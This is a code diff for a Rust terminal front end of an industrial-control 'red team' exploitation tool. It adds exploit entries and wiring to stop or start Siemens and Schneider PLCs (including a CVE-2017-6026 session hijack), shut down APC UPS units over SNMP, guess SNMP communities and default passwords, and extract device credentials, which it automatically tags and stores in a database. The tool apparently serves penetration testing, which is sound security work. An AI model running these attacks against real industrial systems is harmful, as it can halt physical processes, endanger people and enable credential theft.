@@ -1,3 +1,7 @@
+//! TUI frontend for scadaver.
+//!
+//! MQTT topic browser, live message display, and topic table layout were informed by
+//! `mqttui` by `EdJoPaTo`: <https://github.com/EdJoPaTo/mqttui>
 #![allow(clippy::too_many_lines)]
 use crate::core::autodetect::{probe_all, DeviceInfo};
 use crate::core::network::{get_interfaces, local_ip_for, NetworkInterface};
@@ -14,10 +18,12 @@ use ratatui::{
 };
 use serde_json::Value;
 use std::collections::{HashMap, HashSet, VecDeque};
+use std::fmt::Write as _;
 use std::sync::atomic::{AtomicBool, Ordering};
-use std::sync::{mpsc, Arc};
+use std::sync::{mpsc, Arc, Mutex};
 use std::time::Duration;
-use scadaver::vendors::mqtt::session::{ConnectOptions, MqttSession};
+use scadaver::vendors::mqtt::attacks::{acl_variants, classify_payload, is_sensitive};
+use scadaver::vendors::mqtt::session::{ConnectOptions, MqttSession, MqttVersion};
 
 // ─── Background events ───────────────────────────────────────────────────────
 
@@ -25,6 +31,16 @@ enum ScanEvent {
     DeviceFound(DeviceInfo),
     Done(String),
     Output(String),
+    MqttLine(String),
+    MqttDone(String),
+    CredFound { ip: String, username: String, password: String },
+}
+
+#[derive(Clone, Copy, PartialEq, Eq, Default)]
+enum ExportFormat {
+    #[default]
+    Json,
+    Csv,
 }
 
 // ─── Exploit catalogue ───────────────────────────────────────────────────────
@@ -137,9 +153,9 @@ fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
                 .risk(ExploitRisk::WriteControl),
         ],
         "siemens" => vec![
-            ExploitDef::new("Read CPU State").capability(CapabilityKey::S7Tcp),
-            ExploitDef::new("Read I/O (inputs/outputs/merkers)").capability(CapabilityKey::S7Tcp),
-            ExploitDef::new("Toggle CPU State (run\u{2194}stop)")
+            ExploitDef::with_input("Read CPU State", "password (empty = stored / no auth)").capability(CapabilityKey::S7Tcp),
+            ExploitDef::with_input("Read I/O (inputs/outputs/merkers)", "password (empty = stored / no auth)").capability(CapabilityKey::S7Tcp),
+            ExploitDef::with_input("Toggle CPU State (run\u{2194}stop)", "password (empty = stored / no auth)")
                 .capability(CapabilityKey::S7Tcp)
                 .risk(ExploitRisk::WriteControl),
             ExploitDef::with_input("Set Outputs", "01010101")
@@ -148,7 +164,7 @@ fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
             ExploitDef::with_input("Set Merkers", "bits:offset")
                 .capability(CapabilityKey::S7Tcp)
                 .risk(ExploitRisk::WriteControl),
-            ExploitDef::new("List Data Blocks")
+            ExploitDef::with_input("List Data Blocks", "password (empty = stored / no auth)")
                 .capability(CapabilityKey::S7Tcp)
                 .risk(ExploitRisk::LongRunning),
             ExploitDef::with_input("Read Data Block", "DB1:0:64").capability(CapabilityKey::S7Tcp),
@@ -163,13 +179,13 @@ fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
             ExploitDef::new("Flash LED")
                 .capability(CapabilityKey::SchneiderIdentity)
                 .risk(ExploitRisk::WriteControl),
-            ExploitDef::new("Session Hijack: get info [CVE-2017-6026]")
+            ExploitDef::with_input("Session Hijack: get info [CVE-2017-6026]", "username (default: Administrator)")
                 .capability(CapabilityKey::SchneiderWeb)
                 .risk(ExploitRisk::SensitiveRead),
-            ExploitDef::new("Session Hijack: stop PLC [CVE-2017-6026]")
+            ExploitDef::with_input("Session Hijack: stop PLC [CVE-2017-6026]", "username (default: Administrator)")
                 .capability(CapabilityKey::SchneiderWeb)
                 .risk(ExploitRisk::WriteControl),
-            ExploitDef::new("Session Hijack: run PLC [CVE-2017-6026]")
+            ExploitDef::with_input("Session Hijack: run PLC [CVE-2017-6026]", "username (default: Administrator)")
                 .capability(CapabilityKey::SchneiderWeb)
                 .risk(ExploitRisk::WriteControl),
             ExploitDef::new("Map Modbus: Quick").capability(CapabilityKey::SchneiderModbus),
@@ -299,21 +315,36 @@ fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
                 .risk(ExploitRisk::WriteControl),
         ],
         "snmp" => vec![
-            ExploitDef::new("System Info (sysDescr / OID / uptime)").capability(CapabilityKey::SnmpUdp),
-            ExploitDef::new("Interface Table (MAC / speed / errors)").capability(CapabilityKey::SnmpUdp),
-            ExploitDef::new("Network Topology (IP addrs / routes / ARP)").capability(CapabilityKey::SnmpUdp),
+            ExploitDef::with_input("System Info (sysDescr / OID / uptime)", "read community (empty = auto-discover)").capability(CapabilityKey::SnmpUdp),
+            ExploitDef::with_input("Interface Table (MAC / speed / errors)", "read community (empty = auto-discover)").capability(CapabilityKey::SnmpUdp),
+            ExploitDef::with_input("Network Topology (IP addrs / routes / ARP)", "read community (empty = auto-discover)").capability(CapabilityKey::SnmpUdp),
             ExploitDef::new("Community Scan (try common strings)").capability(CapabilityKey::SnmpUdp).risk(ExploitRisk::SensitiveRead),
-            ExploitDef::new("CVE Probe (match sysDescr → advisories)").capability(CapabilityKey::SnmpUdp),
-            ExploitDef::with_input("Walk OID Subtree", "OID (default: 1.3.6.1.2.1.1)")
+            ExploitDef::with_input("CVE Probe (match sysDescr → advisories)", "read community (empty = auto-discover)").capability(CapabilityKey::SnmpUdp),
+            ExploitDef::with_input("Walk OID Subtree", "OID [community]  e.g. 1.3.6.1.2.1 public")
                 .capability(CapabilityKey::SnmpUdp)
                 .risk(ExploitRisk::LongRunning),
             ExploitDef::with_input("Test Write Access (SET sysName → same value)", "write community (default: private)")
                 .capability(CapabilityKey::SnmpWrite)
                 .risk(ExploitRisk::SensitiveRead),
-            ExploitDef::new("APC UPS: Status (battery / load / runtime)").capability(CapabilityKey::SnmpApc),
+            ExploitDef::with_input("APC UPS: Status (battery / load / runtime)", "read community (empty = auto-discover)").capability(CapabilityKey::SnmpApc),
             ExploitDef::with_input("APC UPS: Graceful Shutdown [DESTRUCTIVE]", "write community (default: private)")
                 .capability(CapabilityKey::SnmpApc)
                 .risk(ExploitRisk::WriteControl),
+        ],
+        "bacnet" => vec![
+            ExploitDef::new("Device Info"),
+            ExploitDef::new("Property Dump"),
+            ExploitDef::new("Who-Is Broadcast"),
+        ],
+        "dnp3" => vec![
+            ExploitDef::new("Device Attributes"),
+            ExploitDef::new("Integrity Poll"),
+            ExploitDef::with_input("Direct Operate", "point_id:state (e.g. 10:1)"),
+        ],
+        "opcua" => vec![
+            ExploitDef::new("Server Info"),
+            ExploitDef::new("Enumerate Endpoints"),
+            ExploitDef::with_input("Try Auth Bypass", "endpoint index (default 0)"),
         ],
         _ => vec![ExploitDef::new("Auto-detect / rescan")],
     };
@@ -334,6 +365,9 @@ const ALL_VENDORS: &[&str] = &[
     "ewon",
     "snmp",
     "iec104",
+    "bacnet",
+    "dnp3",
+    "opcua",
 ];
 
 const SCAN_ITEMS: &[&str] = &[
@@ -531,6 +565,22 @@ enum Mode {
     OutputZoom,
     MqttMonitor,
     MqttClientIdInput,
+    MqttCredInput,
+    ImportInput,
+    WordlistInput,
+}
+
+/// MQTT connection settings configurable before connecting.
+#[derive(Clone, Copy)]
+struct MqttConnSettings {
+    tls: bool,
+    version: MqttVersion,
+}
+
+impl Default for MqttConnSettings {
+    fn default() -> Self {
+        Self { tls: false, version: MqttVersion::V311 }
+    }
 }
 
 struct App {
@@ -558,7 +608,7 @@ struct App {
     active_jobs: u32,
     references_scroll: usize,
     stealth: bool,
-    mqtt_session: Option<MqttSession>,
+    mqtt_session: Option<Arc<Mutex<MqttSession>>>,
     mqtt_broker: String,
     mqtt_topics: Vec<(String, usize, String)>,
     mqtt_retained: HashSet<String>,
@@ -568,6 +618,12 @@ struct App {
     mqtt_attack_lines: Vec<String>,
     mqtt_attack_scroll: usize,
     mqtt_attack_label: String,
+    mqtt_attack_running: bool,
+    mqtt_username: String,
+    mqtt_password: String,
+    mqtt_conn: MqttConnSettings,
+    wordlist_path: Option<String>,
+    export_format: ExportFormat,
 }
 
 impl App {
@@ -615,6 +671,12 @@ impl App {
             mqtt_attack_lines: Vec::new(),
             mqtt_attack_scroll: 0,
             mqtt_attack_label: String::new(),
+            mqtt_attack_running: false,
+            mqtt_username: String::new(),
+            mqtt_password: String::new(),
+            mqtt_conn: MqttConnSettings::default(),
+            wordlist_path: None,
+            export_format: ExportFormat::default(),
         }
     }
 
@@ -774,18 +836,39 @@ impl App {
                     }
                     self.output_lines.push(line);
                 }
+                ScanEvent::MqttLine(line) => {
+                    self.mqtt_attack_lines.push(line);
+                }
+                ScanEvent::MqttDone(label) => {
+                    self.mqtt_attack_label = label;
+                    self.mqtt_attack_running = false;
+                }
+                ScanEvent::CredFound { ip, username, password } => {
+                    let fields = serde_json::json!({
+                        "discovered_username": username,
+                        "discovered_password": password,
+                    });
+                    let _ = db.upsert_device(&ip, "discovered_creds", &fields);
+                    if self.output_lines.len() >= 500 {
+                        self.output_lines.remove(0);
+                    }
+                    self.output_lines.push(format!("[+] Credentials saved for {ip}: {username}"));
+                }
             }
         }
     }
 
     fn drain_mqtt_messages(&mut self) {
         let messages = match &self.mqtt_session {
-            Some(s) => s.drain_messages(),
+            Some(arc) => match arc.try_lock() {
+                Ok(s) => s.drain_messages(),
+                Err(_) => return,
+            },
             None => return,
         };
         for msg in messages {
             self.mqtt_total_msgs += 1;
-            let (fmt, display) = detect_payload_tui(&msg.topic, &msg.payload);
+            let (fmt, display) = classify_payload(&msg.topic, &msg.payload);
             let label = format!("{display}  [{fmt}]");
             if let Some(entry) = self.mqtt_topics.iter_mut().find(|(t, _, _)| t == &msg.topic) {
                 entry.1 += 1;
@@ -817,16 +900,19 @@ impl App {
             client_id: "scadaver-tui".into(),
             keepalive: 60,
             clean_session: true,
-            username: None,
-            password: None,
+            username: if self.mqtt_username.is_empty() { None } else { Some(self.mqtt_username.clone()) },
+            password: if self.mqtt_password.is_empty() { None } else { Some(self.mqtt_password.clone()) },
             will: None,
+            tls: self.mqtt_conn.tls || port == 8883,
+            tls_verify: false,
+            protocol_version: self.mqtt_conn.version,
         };
         match MqttSession::connect(&opts) {
             Ok(mut session) => {
                 let _ = session.subscribe("#", 0);
                 let _ = session.subscribe("$SYS/#", 0);
                 self.mqtt_broker = format!("{ip}:{port}");
-                self.mqtt_session = Some(session);
+                self.mqtt_session = Some(Arc::new(Mutex::new(session)));
                 self.mode = Mode::MqttMonitor;
                 self.log(format!("[*] MQTT monitor \u{2192} {ip}:{port}"));
             }
@@ -1784,8 +1870,19 @@ fn run_exploit_for(
     let label = label.to_string();
 
     std::thread::spawn(move || {
-        let out = |msg: &str| {
-            let _ = tx.send(ScanEvent::Output(msg.to_string()));
+        let ip2 = ip.clone();
+        let tx2 = tx.clone();
+        let out = move |msg: &str| {
+            if let Some(rest) = msg.strip_prefix("[CRED] ") {
+                if let Some((user, pass)) = rest.split_once(':') {
+                    let _ = tx2.send(ScanEvent::CredFound {
+                        ip: ip2.clone(),
+                        username: user.to_string(),
+                        password: pass.to_string(),
+                    });
+                }
+            }
+            let _ = tx2.send(ScanEvent::Output(msg.to_string()));
         };
         dispatch_exploit(&vendor, idx, &ip, port, &input, out, &tx);
         let _ = tx.send(ScanEvent::Done(format!("{label} @ {ip}")));
@@ -1812,9 +1909,9 @@ fn dispatch_exploit(
         ("siemens", 1) => exploit_siemens_io(ip, port, input, &out),
         ("siemens", 2) => exploit_siemens_toggle(ip, port, input, &out),
         ("schneider" | "modicon", 0) => exploit_schneider_flash(ip, &out),
-        ("schneider" | "modicon", 1) => exploit_schneider_hijack_info(ip, port, &out),
-        ("schneider" | "modicon", 2) => exploit_schneider_action(ip, port, "stop", &out),
-        ("schneider" | "modicon", 3) => exploit_schneider_action(ip, port, "run", &out),
+        ("schneider" | "modicon", 1) => exploit_schneider_hijack_info(ip, port, input, &out),
+        ("schneider" | "modicon", 2) => exploit_schneider_action(ip, port, "stop", input, &out),
+        ("schneider" | "modicon", 3) => exploit_schneider_action(ip, port, "run", input, &out),
         ("phoenix", 0) => exploit_phoenix_passwords(ip, port, &out),
         ("phoenix", 1) => exploit_phoenix_list_tags(ip, port, &out),
         ("phoenix", 2) => exploit_phoenix_read_tags(ip, port, &out),
@@ -1877,15 +1974,152 @@ fn dispatch_exploit(
         ("iec104", 1) => exploit_iec104_sc_on(ip, port, input, &out),
         ("iec104", 2) => exploit_iec104_sc_off(ip, port, input, &out),
         ("iec104", 3) => exploit_iec104_dc(ip, port, input, &out),
-        ("snmp", 0) => exploit_snmp_sys_info(ip, port, &out),
-        ("snmp", 1) => exploit_snmp_interfaces(ip, port, &out),
-        ("snmp", 2) => exploit_snmp_topology(ip, port, &out),
+        ("snmp", 0) => exploit_snmp_sys_info(ip, port, input, &out),
+        ("snmp", 1) => exploit_snmp_interfaces(ip, port, input, &out),
+        ("snmp", 2) => exploit_snmp_topology(ip, port, input, &out),
         ("snmp", 3) => exploit_snmp_community_scan(ip, port, &out),
-        ("snmp", 4) => exploit_snmp_cve_probe(ip, port, &out),
+        ("snmp", 4) => exploit_snmp_cve_probe(ip, port, input, &out),
         ("snmp", 5) => exploit_snmp_walk(ip, port, input, &out),
         ("snmp", 6) => exploit_snmp_test_write(ip, port, input, &out),
-        ("snmp", 7) => exploit_snmp_apc_status(ip, port, &out),
+        ("snmp", 7) => exploit_snmp_apc_status(ip, port, input, &out),
         ("snmp", 8) => exploit_snmp_apc_shutdown(ip, port, input, &out),
+        ("bacnet", 0) => {
+            use crate::vendors::bacnet::client as bacnet;
+            let timeout = std::time::Duration::from_secs(5);
+            if let Some(dev) = bacnet::scan_ip(ip, 5) {
+                out(&format!("Instance ID : {}", dev.instance_id));
+                out(&format!("Vendor      : {} (ID {})", dev.vendor_name, dev.vendor_id));
+                out(&format!("Object Name : {}", dev.object_name));
+                out(&format!("Description : {}", dev.description));
+                out(&format!("Firmware    : {}", dev.firmware_revision));
+                out(&format!("Max APDU    : {}", dev.max_apdu));
+            } else {
+                out("No BACnet device responded");
+            }
+            let _ = timeout; // suppress unused
+        }
+        ("bacnet", 1) => {
+            use crate::vendors::bacnet::client as bacnet;
+            let timeout = std::time::Duration::from_secs(5);
+            if let Some(dev) = bacnet::scan_ip(ip, 5) {
+                let prop_ids = [
+                    (bacnet::PROP_OBJECT_NAME, "Object-Name"),
+                    (bacnet::PROP_DESCRIPTION, "Description"),
+                    (bacnet::PROP_FIRMWARE_REVISION, "Firmware-Revision"),
+                    (bacnet::PROP_VENDOR_NAME, "Vendor-Name"),
+                    (bacnet::PROP_VENDOR_IDENTIFIER, "Vendor-Identifier"),
+                ];
+                for (prop_id, label) in prop_ids {
+                    if let Some(val) = bacnet::read_property(ip, dev.instance_id, prop_id, timeout) {
+                        out(&format!("{label}: {val}"));
+                    }
+                }
+            } else {
+                out("No BACnet device responded");
+            }
+        }
+        ("bacnet", 2) => {
+            use crate::vendors::bacnet::client as bacnet;
+            let timeout = std::time::Duration::from_secs(5);
+            let devices = bacnet::who_is_broadcast(timeout);
+            if devices.is_empty() {
+                out("No BACnet devices found on broadcast");
+            } else {
+                out(&format!("Found {} device(s):", devices.len()));
+                for dev in &devices {
+                    out(&format!("  {} — instance {} vendor_id {}", dev.ip, dev.instance_id, dev.vendor_id));
+                    if !dev.object_name.is_empty() {
+                        out(&format!("    Name: {}", dev.object_name));
+                    }
+                }
+            }
+        }
+        ("dnp3", 0) => {
+            use crate::vendors::dnp3::client as dnp3;
+            let timeout = std::time::Duration::from_secs(5);
+            let attrs = dnp3::read_device_attributes(ip, timeout);
+            if attrs.is_empty() {
+                out("No device attributes returned (device may not support group 0)");
+            } else {
+                let mut pairs: Vec<_> = attrs.iter().collect();
+                pairs.sort_by_key(|(k, _)| k.as_str());
+                for (k, v) in pairs {
+                    out(&format!("{k}: {v}"));
+                }
+            }
+        }
+        ("dnp3", 1) => {
+            use crate::vendors::dnp3::client as dnp3;
+            let timeout = std::time::Duration::from_secs(5);
+            let lines = dnp3::read_integrity_poll(ip, timeout);
+            if lines.is_empty() {
+                out("No integrity poll response received");
+            } else {
+                out(&format!("Received {} frame(s):", lines.len()));
+                for l in &lines { out(l); }
+            }
+        }
+        ("dnp3", 2) => {
+            if let Some((point_str, state_str)) = input.split_once(':') {
+                let point: u16 = point_str.trim().parse().unwrap_or(0);
+                let state: u8 = state_str.trim().parse().unwrap_or(0);
+                out(&format!("Direct Operate: point={point} state={state}"));
+                out("Note: Direct Operate send not yet implemented; use DNP3 master software for write operations.");
+            } else {
+                out("Input format: point_id:state (e.g. 10:1)");
+            }
+        }
+        ("opcua", 0) => {
+            use crate::vendors::opcua::client as opcua;
+            let timeout = std::time::Duration::from_secs(5);
+            if let Some(server) = opcua::detect(ip, 4840, timeout) {
+                let endpoints = opcua::get_endpoints(ip, 4840, timeout);
+                out(&format!("IP          : {}", server.ip));
+                out(&format!("Port        : {}", server.port));
+                out(&format!("Endpoints   : {}", endpoints.len()));
+                let anon = endpoints.iter().any(|e| e.allows_anonymous && e.security_mode == "None");
+                out(&format!("Anon access : {}", if anon { "YES — unauthenticated access possible" } else { "No" }));
+                let modes: std::collections::HashSet<_> = endpoints.iter().map(|e| e.security_mode.as_str()).collect();
+                let mut modes_v: Vec<_> = modes.into_iter().collect();
+                modes_v.sort_unstable();
+                out(&format!("Sec modes   : {}", modes_v.join(", ")));
+            } else {
+                out("No OPC-UA server responded (port 4840)");
+            }
+        }
+        ("opcua", 1) => {
+            use crate::vendors::opcua::client as opcua;
+            let timeout = std::time::Duration::from_secs(5);
+            let endpoints = opcua::get_endpoints(ip, 4840, timeout);
+            if endpoints.is_empty() {
+                out("No endpoints returned — server may require a different port or security policy");
+            } else {
+                for (i, ep) in endpoints.iter().enumerate() {
+                    out(&format!("[{i}] {}", ep.url));
+                    out(&format!("    Security policy : {}", ep.security_policy));
+                    out(&format!("    Security mode   : {}", ep.security_mode));
+                    out(&format!("    Anonymous auth  : {}", ep.allows_anonymous));
+                }
+            }
+        }
+        ("opcua", 2) => {
+            use crate::vendors::opcua::client as opcua;
+            let timeout = std::time::Duration::from_secs(5);
+            let endpoints = opcua::get_endpoints(ip, 4840, timeout);
+            let vuln: Vec<_> = endpoints.iter()
+                .filter(|e| e.allows_anonymous && e.security_mode == "None")
+                .collect();
+            if vuln.is_empty() {
+                out("No None-security anonymous endpoints found");
+                out("All endpoints require authentication or encryption");
+            } else {
+                out(&format!("[VULN] Found {} anonymous endpoint(s):", vuln.len()));
+                for ep in &vuln {
+                    out(&format!("  [VULN] {}", ep.url));
+                    out("  Anonymous connect allowed with no encryption");
+                }
+            }
+        }
         _ => {
             // Auto-detect rescan: probe all protocols, emit DeviceFound
             out(&format!("[*] Auto-detecting {ip}..."));
@@ -2007,15 +2241,17 @@ fn device_field_str(ip: &str, key: &str) -> Option<String> {
     dev.fields[key].as_str().map(str::to_string)
 }
 
-fn exploit_siemens_cpu(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_cpu(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::siemens::s7comm;
     let port = if port == 0 { 102 } else { port };
-    let password = device_field_str(ip, "password");
+    let db_password = device_field_str(ip, "password");
+    let password: Option<&str> =
+        if input.trim().is_empty() { db_password.as_deref() } else { Some(input.trim()) };
     out(&format!("[*] Reading CPU state from {ip}:{port}..."));
-    let state = s7comm::get_cpu_state(ip, port, 5, password.as_deref());
+    let state = s7comm::get_cpu_state(ip, port, 5, password);
     if state == "Unknown" {
         if s7comm::probe_auth_required(ip, port, 5) {
-            out("[-] Access denied: store password in device fields[\"password\"] to authenticate");
+            out("[-] Access denied: enter password in the exploit prompt or store in device fields[\"password\"]");
         } else {
             out("[-] Could not read CPU state");
         }
@@ -2024,12 +2260,14 @@ fn exploit_siemens_cpu(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_siemens_io(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_io(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::siemens::s7comm;
     let port = if port == 0 { 102 } else { port };
-    let password = device_field_str(ip, "password");
+    let db_password = device_field_str(ip, "password");
+    let password: Option<&str> =
+        if input.trim().is_empty() { db_password.as_deref() } else { Some(input.trim()) };
     out(&format!("[*] Reading I/O from {ip}:{port}..."));
-    let data = s7comm::read_all_data(ip, port, 5, password.as_deref());
+    let data = s7comm::read_all_data(ip, port, 5, password);
     let [hdr, sep] = io_header();
     let mut all_addrs: Vec<String> = Vec::new();
     let mut all_vals: Vec<String> = Vec::new();
@@ -2071,7 +2309,7 @@ fn exploit_siemens_io(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
 
     if !has_any {
         if s7comm::probe_auth_required(ip, port, 5) {
-            out("[-] Access denied: store password in device fields[\"password\"] to authenticate");
+            out("[-] Access denied: enter password in the exploit prompt or store in device fields[\"password\"]");
         } else {
             out("[-] No I/O data received");
         }
@@ -2085,18 +2323,20 @@ fn exploit_siemens_io(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
     save_and_diff(ip, "s7", &points, out);
 }
 
-fn exploit_siemens_toggle(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_toggle(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::siemens::s7comm;
     let port = if port == 0 { 102 } else { port };
-    let password = device_field_str(ip, "password");
+    let db_password = device_field_str(ip, "password");
+    let password: Option<&str> =
+        if input.trim().is_empty() { db_password.as_deref() } else { Some(input.trim()) };
     out(&format!("[*] Toggling CPU state on {ip}:{port}..."));
     if s7comm::change_cpu_state(ip, port, 5) {
         out(&format!(
             "[+] New state: {}",
-            s7comm::get_cpu_state(ip, port, 5, password.as_deref())
+            s7comm::get_cpu_state(ip, port, 5, password)
         ));
     } else if s7comm::probe_auth_required(ip, port, 5) {
-        out("[-] Access denied: store password in device fields[\"password\"] to authenticate");
+        out("[-] Access denied: enter password in the exploit prompt or store in device fields[\"password\"]");
     } else {
         out("[-] Failed to toggle CPU state");
     }
@@ -2111,14 +2351,15 @@ fn exploit_schneider_flash(ip: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_schneider_hijack_info(ip: &str, port: u16, out: &impl Fn(&str)) {
+fn exploit_schneider_hijack_info(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::schneider::session_hijack;
+    let username = if input.trim().is_empty() { "Administrator" } else { input.trim() };
     out(&format!("[*] Getting session cookie from {ip}..."));
     match session_hijack::get_session_cookie(ip, port) {
         Some(s) => {
             out(&format!("[+] Cookie:          {}", s.cookie_value));
             out(&format!("    Power-on count:  {}", s.power_on_count));
-            if let Some(info) = session_hijack::get_device_info(ip, port, &s.cookie_value, "Administrator") {
+            if let Some(info) = session_hijack::get_device_info(ip, port, &s.cookie_value, username) {
                 out(&format!("    Device:          {}", info.device));
                 out(&format!("    MAC:             {}", info.mac));
                 out(&format!("    Firmware:        {}", info.firmware));
@@ -2129,13 +2370,14 @@ fn exploit_schneider_hijack_info(ip: &str, port: u16, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_schneider_action(ip: &str, port: u16, action: &str, out: &impl Fn(&str)) {
+fn exploit_schneider_action(ip: &str, port: u16, action: &str, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::schneider::session_hijack;
+    let username = if input.trim().is_empty() { "Administrator" } else { input.trim() };
     out(&format!("[*] Getting session cookie from {ip}..."));
     match session_hijack::get_session_cookie(ip, port) {
         Some(s) => {
             out(&format!("[+] Cookie: {}", s.cookie_value));
-            if session_hijack::control_plc(ip, port, &s.cookie_value, "Administrator", action) {
+            if session_hijack::control_plc(ip, port, &s.cookie_value, username, action) {
                 out(&format!("[+] PLC {action} command sent"));
             } else {
                 out(&format!("[-] Failed to {action} PLC"));
@@ -2153,6 +2395,7 @@ fn exploit_phoenix_passwords(ip: &str, port: u16, out: &impl Fn(&str)) {
             for e in &entries {
                 if let Some(p) = &e.password {
                     out(&format!("  Level {}: {p}", e.user_level));
+                    out(&format!("[CRED] level{}:{p}", e.user_level));
                 } else if let Some(h) = &e.hash {
                     out(&format!("  Level {} [sha256]: {h}", e.user_level));
                 }
@@ -2242,6 +2485,7 @@ fn exploit_ewon_creds(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
         if !u.access_rights.is_empty() {
             out(&format!("    Access: {}", u.access_rights));
         }
+        out(&format!("[CRED] {}:{}", u.username, u.password));
     }
     out(&format!("[+] {} user(s) extracted", users.len()));
 }
@@ -2788,17 +3032,19 @@ fn exploit_siemens_set_merkers(ip: &str, port: u16, input: &str, out: &impl Fn(&
     }
 }
 
-fn exploit_siemens_list_dbs(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_list_dbs(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::siemens::s7comm;
     let port = if port == 0 { 102 } else { port };
-    let password = device_field_str(ip, "password");
+    let db_password = device_field_str(ip, "password");
+    let password: Option<&str> =
+        if input.trim().is_empty() { db_password.as_deref() } else { Some(input.trim()) };
     out(&format!(
         "[*] Scanning DB1..200 on {ip}:{port} (may take a moment)..."
     ));
-    let blocks = s7comm::list_data_blocks(ip, port, 5, password.as_deref());
+    let blocks = s7comm::list_data_blocks(ip, port, 5, password);
     if blocks.is_empty() {
         if s7comm::probe_auth_required(ip, port, 5) {
-            out("[-] Access denied: store password in device fields[\"password\"] to authenticate");
+            out("[-] Access denied: enter password in the exploit prompt or store in device fields[\"password\"]");
         } else {
             out("[-] No readable data blocks found");
         }
@@ -4079,6 +4325,7 @@ fn exploit_siemens_try_defaults(ip: &str, port: u16, out: &impl Fn(&str)) {
         if state != "Unknown" {
             out(&format!("[+] Password accepted: \"{display}\""));
             out(&format!("    CPU State: {state}"));
+            out(&format!("[CRED] :{pw}"));
             return;
         }
     }
@@ -4346,17 +4593,20 @@ fn draw_header(frame: &mut Frame, area: Rect, app: &App) {
     let title = format!(" SCADAver ICS Red Team Tool v1.0{scan_tag}{stealth_tag} ");
     let keys = match app.mode {
         Mode::Normal =>
-            " [A] Add IP  [S] Scan  [E] Exploit  [M] MQTT  [W] References  [R] Rescan  [D] Delete  [/] Search  [O] Zoom  [C] Clear  [Z] Stealth  [?] Help  [Q] Quit",
+            " [A] Add IP  [S] Scan  [E] Exploit  [M] MQTT  [U] Creds  [B] Refs  [I] Import  [W] WL  [R] Rescan  [D] Delete  [/] Search  [O] Zoom  [C] Clear  [F] Fmt  [X] Export  [Z] Stealth  [?] Help  [Q] Quit",
         Mode::MqttMonitor =>
-            " [j/k] Nav  [a] ACL  [r] Retain  [s] Session  [c] Clear  [/] Filter  [ESC/M] Disconnect",
+            " [j/k] Nav  [a] ACL  [r] Retain  [s] Session  [c] Clear  [/] Clear filter  [ESC/M] Disconnect",
         Mode::MqttClientIdInput => " Enter ClientID to hijack \u{2014} [ENTER] run  [ESC] cancel",
+        Mode::MqttCredInput => " MQTT credentials: user:pass (empty = no auth) \u{2014} [ENTER] save  [ESC] cancel",
         Mode::IpInput => " Enter IP address \u{2014} [ESC] cancel",
         Mode::ExploitMenu => " [J/K] Navigate  [ENTER] Run  [V] View as protocol  [O] Zoom  [PgUp/PgDn] Scroll  [ESC] back",
         Mode::Search => " Type to filter \u{2014} [ESC] clear  [ENTER] confirm",
         Mode::ExploitInput => " Enter parameter \u{2014} [ENTER] run  [ESC] cancel",
         Mode::ExploitConfirm => " Type YES to confirm action \u{2014} [ENTER] confirm  [ESC] cancel",
         Mode::OutputZoom => " [J/K/PgUp/PgDn] Scroll  [G] Bottom  [g] Top  [C] Clear  [O/ESC] Close",
-        Mode::References => " [J/K/↑↓] Scroll  [W/ESC] Close",
+        Mode::References => " [J/K/\u{2191}\u{2193}] Scroll  [B/ESC] Close",
+        Mode::ImportInput => " nmap XML path \u{2014} [ENTER] import  [ESC] cancel",
+        Mode::WordlistInput => " Wordlist path (empty = built-in defaults) \u{2014} [ENTER] save  [ESC] cancel",
         _ => " [ESC / ?] back",
     };
 
@@ -4476,6 +4726,9 @@ fn draw_right_panel(frame: &mut Frame, area: Rect, app: &mut App) {
         Mode::Search => draw_search_panel(frame, area, app),
         Mode::MqttMonitor => draw_mqtt_panel(frame, area, app),
         Mode::MqttClientIdInput => draw_mqtt_clientid_input(frame, area, app),
+        Mode::MqttCredInput => draw_mqtt_cred_input(frame, area, app),
+        Mode::ImportInput => draw_import_input(frame, area, app),
+        Mode::WordlistInput => draw_wordlist_input(frame, area, app),
         _ => draw_detail_panel(frame, area, app),
     }
 }
@@ -5333,7 +5586,7 @@ fn draw_help(frame: &mut Frame, area: Rect) {
 
 fn handle_references(app: &mut App, code: KeyCode) {
     match code {
-        KeyCode::Esc | KeyCode::Char('w' | 'W') => app.mode = Mode::Normal,
+        KeyCode::Esc | KeyCode::Char('b' | 'B') => app.mode = Mode::Normal,
         KeyCode::Char('j') | KeyCode::Down => {
             app.references_scroll = app.references_scroll.saturating_add(1);
         }
@@ -5579,6 +5832,18 @@ fn handle_key(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers) -
             handle_mqtt_client_id_input(app, code);
             false
         }
+        Mode::MqttCredInput => {
+            handle_mqtt_cred_input(app, code);
+            false
+        }
+        Mode::ImportInput => {
+            handle_import_input(app, db, code);
+            false
+        }
+        Mode::WordlistInput => {
+            handle_wordlist_input(app, code);
+            false
+        }
     }
 }
 
@@ -5663,6 +5928,28 @@ fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers
             app.output_lines.clear();
             app.output_scroll = 0;
         }
+        KeyCode::Char('x' | 'X') => match export_to_file(app) {
+            Ok(path) => {
+                app.output_lines.push(format!("[*] Exported to {path}"));
+                app.output_scroll = 0;
+            }
+            Err(e) => app.output_lines.push(format!("[!] Export failed: {e:#}")),
+        },
+        KeyCode::Char('f' | 'F') => {
